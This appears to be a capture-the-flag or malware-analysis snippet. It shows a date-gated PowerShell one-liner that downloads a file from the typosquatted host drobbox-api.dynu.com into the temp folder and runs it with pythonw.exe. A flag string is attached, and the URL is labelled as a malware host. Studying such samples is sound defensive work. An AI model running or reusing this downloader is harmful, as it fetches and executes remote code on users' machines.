if ((Get-Date).Ticks -lt (Get-Date -Date '18-jan-2017 00:00:00').Ticks) {(New-Object System.Net.WebClient).DownloadFile('http://drobbox-api.dynu.com/update',"$env:temp\update");Start-Process pythonw.exe "$env:temp\update 31337"};#NIXU17{pow3r_t0_the_sh3lls}
############################## Malicious code  ##############################
Malware hosting URLs: http://drobbox-api.dynu.com/update
